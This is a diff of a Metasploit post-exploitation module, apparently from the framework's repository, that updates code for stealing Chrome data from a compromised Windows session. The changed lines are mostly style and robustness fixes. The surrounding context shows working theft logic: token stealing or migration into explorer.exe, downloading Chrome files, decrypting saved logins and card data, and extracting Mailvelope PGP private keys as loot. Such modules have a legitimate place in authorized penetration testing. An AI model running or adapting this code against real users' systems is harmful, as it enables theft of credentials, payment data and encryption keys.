@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Priv
 
@@ -33,7 +29,7 @@ class Metasploit3 < Msf::Post
     register_options(
       [
         OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', false]),
-      ], self.class)
+      ])
   end
 
   def extension_mailvelope_parse_key(data)
@@ -52,7 +48,7 @@ class Metasploit3 < Msf::Post
       vprint_good(key_data)
       path = store_loot(
         "chrome.mailvelope.#{priv_or_pub}", "text/plain", session, key_data, "#{priv_or_pub}.key", "Mailvelope PGP #{priv_or_pub.capitalize} Key")
-      print_status("==> Saving #{priv_or_pub} key to: #{path}")
+      print_good("==> Saving #{priv_or_pub} key to: #{path}")
     end
   end
 
@@ -66,7 +62,7 @@ class Metasploit3 < Msf::Post
     print_status("==> Downloading Mailvelope database...")
     local_path = store_loot("chrome.ext.mailvelope", "text/plain", session, "chrome_ext_mailvelope")
     session.fs.file.download_file(local_path, maildb_path)
-    print_status("==> Downloaded to #{local_path}")
+    print_good("==> Downloaded to #{local_path}")
 
     maildb = SQLite3::Database.new(local_path)
     columns, *rows = maildb.execute2("select * from ItemTable;")
@@ -85,13 +81,15 @@ class Metasploit3 < Msf::Post
       prefs = f.read
     end
     results = ActiveSupport::JSON.decode(prefs)
-    print_status("Extensions installed: ")
-    results['extensions']['settings'].each do |name,values|
-      if values['manifest']
-        print_status("=> #{values['manifest']['name']}")
-        if values['manifest']['name'] =~ /mailvelope/i
-          print_good("==> Found Mailvelope extension, extracting PGP keys")
-          extension_mailvelope(username, name)
+    if results['extensions']['settings']
+      print_status("Extensions installed: ")
+      results['extensions']['settings'].each do |name,values|
+        if values['manifest']
+          print_status("=> #{values['manifest']['name']}")
+          if values['manifest']['name'] =~ /mailvelope/i
+            print_good("==> Found Mailvelope extension, extracting PGP keys")
+            extension_mailvelope(username, name)
+          end
         end
       end
     end
@@ -129,7 +127,7 @@ class Metasploit3 < Msf::Post
 
   def process_files(username)
     secrets = ""
-    decrypt_table = Rex::Ui::Text::Table.new(
+    decrypt_table = Rex::Text::Table.new(
       "Header"  => "Decrypted data",
       "Indent"  => 1,
       "Columns" => ["Name", "Decrypted Data", "Origin"]
@@ -153,7 +151,7 @@ class Metasploit3 < Msf::Post
 
       rows.map! do |row|
         res = Hash[*columns.zip(row).flatten]
-        if item[:encrypted_fields] && session.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
+        if item[:encrypted_fields] && !session.sys.config.is_system?
 
           item[:encrypted_fields].each do |field|
             name = (res["name_on_card"] == nil) ? res["username_value"] : res["name_on_card"]
@@ -172,7 +170,7 @@ class Metasploit3 < Msf::Post
 
     if secrets != ""
       path = store_loot("chrome.decrypted", "text/plain", session, decrypt_table.to_s, "decrypted_chrome_data.txt", "Decrypted Chrome Data")
-      print_status("Decrypted data saved in: #{path}")
+      print_good("Decrypted data saved in: #{path}")
     end
   end
 
@@ -194,7 +192,7 @@ class Metasploit3 < Msf::Post
       local_path = store_loot("chrome.raw.#{f}", "text/plain", session, "chrome_raw_#{f}")
       raw_files[f] = local_path
       session.fs.file.download_file(local_path, remote_path)
-      print_status("Downloaded #{f} to '#{local_path}'")
+      print_good("Downloaded #{f} to '#{local_path}'")
     end
 
     #Assign raw file paths to @chrome_files
@@ -278,7 +276,7 @@ class Metasploit3 < Msf::Post
     # If we can impersonate a token, we use that first.
     # If we can't, we'll try to MIGRATE (more aggressive) if the user wants to
     got_token = steal_token
-    if not got_token and datastore["MIGRATE"]
+    if !got_token && datastore["MIGRATE"]
       migrate_success = migrate
     end
 
@@ -311,7 +309,7 @@ class Metasploit3 < Msf::Post
     else
       uid = session.sys.config.getuid
       print_status "Running as user '#{uid}'..."
-      usernames << env_vars['USERNAME'].strip
+      usernames << env_vars['USERNAME'].strip if env_vars['USERNAME']
     end
 
     has_sqlite3 = true
@@ -330,10 +328,9 @@ class Metasploit3 < Msf::Post
     end
 
     # Migrate back to the original process
-    if datastore["MIGRATE"] and @old_pid and migrate_success == true
+    if datastore["MIGRATE"] && @old_pid && migrate_success
       print_status("Migrating back...")
       migrate(@old_pid)
     end
   end
-
 end
